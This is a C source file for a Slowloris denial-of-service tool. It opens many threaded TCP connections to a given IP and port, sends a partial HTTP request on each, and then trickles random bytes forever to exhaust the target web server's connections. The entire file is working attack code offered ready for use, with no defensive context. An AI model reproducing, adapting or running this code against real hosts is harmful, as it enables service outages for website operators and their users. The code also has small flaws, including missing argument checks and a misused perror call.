#include "slowloris.h"                                                                                                                                   

/*****************************************
 *                                       *
 *      Author  : Youri Klaassens        *
 *      Alias   : Xhendos                *
 *      Date    : 26th of August, 2017   *
 *                                       *
 *                                       *
 *****************************************/

struct essential_data
{
        char *target_ip;
        unsigned int target_port;
        unsigned int thread_number;
};

void *loris_attack(void *arguments)
{
        struct essential_data *argument = (struct essential_data *) arguments;
        struct sockaddr_in socketaddress_descriptor;
        int socket_descriptor = socket(PF_INET, SOCK_STREAM, 0);
        if(socket_descriptor < 0)
        {
                perror("[SLOWLORIS] error in socket_decriptor\n");
                return (void *) NULL;
        }

        /*
         * Set up information for socketaddress_descriptor.
         * struct sockaddr_in is a basic structure for syscalls that deal with internet addresses.
         */

        socketaddress_descriptor.sin_addr.s_addr = inet_addr(argument->target_ip);
        socketaddress_descriptor.sin_port = htons(argument->target_port);
        socketaddress_descriptor.sin_family = AF_INET;

        /*
         * Try to connect to the target IP on port target_port.
         */
        int connect_success = connect(socket_descriptor, (struct sockaddr *) &socketaddress_descriptor, sizeof(socketaddress_descriptor));
        if(connect_success < 0)
        {
                perror("[SLOWLORIS] error in connect()\n");
                return (void *) NULL;
        }

        /*
         * Send a part of a valid HTTP request.
         * If succesfull received, the connection will stay open for x time.
         * x depends on the server settings.
         */
        ssize_t http_succes = send(socket_descriptor, get_message, strlen(get_message), 0);
        if(http_succes >= 0)
        {
                struct timespec sleep_structure;
                sleep_structure.tv_sec = 0;

                while(1)
                {
                        char dummy_character = (char) ((56 * (rand() / (RAND_MAX + 1.0))) + 65);
                        perror(&dummy_character); /* Purposed for verify. This line could be deleted. */
                        send(socket_descriptor, (const char *) &dummy_character, 1, 0);

                        int milisecond = ( 999 * ( rand() / (RAND_MAX + 1.0)));
                        sleep_structure.tv_nsec = (milisecond * 1000000L);

                        if(nanosleep( (const struct timespec *)&sleep_structure, (struct timespec *)NULL) < 0)
                        {
                                perror("[SLOWLORIS] error in nanosleep()\n");
                        }

                }
        }
        /*
         * Close the socket and stop receiving and sending data.
         */
        shutdown(socket_descriptor, SHUT_RDWR);
        return (void *) NULL;
}

int main(int argc, char** argv)
{
        if(argc < 4)
        {
                printf("[SLOWLORIS] Usage ./program <ip> <port> <thread_numbers>\n");
        }

        srand(time(NULL));
        unsigned int thread_numbers = atoi(argv[3]);

        /*
         * Set up structure and assign variables to it.
         * This structure will be used to pass data to a single thread.
         */
        struct essential_data arguments;
        arguments.target_ip = argv[1];
        arguments.target_port = atoi(argv[2]);

        /*
         * Create the amount of threads the command line argument number 4 asked for.
         * pthread_create makes the threads running the function loris_attack.
         * pthread_join will only return if the thread identity has finished its function.
         */
        pthread_t thread_id[thread_numbers + 1];
        for(int i = 0; i < thread_numbers; i++)
        {
                /*
                 * thread_number in struct essential_data is for future use.
                 */
                arguments.thread_number = i;
                pthread_create(&thread_id[i], NULL, &loris_attack, &arguments);
        }

        for(int i = 0; i < thread_numbers; i++)
        {
                pthread_join(thread_id[i], NULL);
        }

        return EXIT_SUCCESS;
}

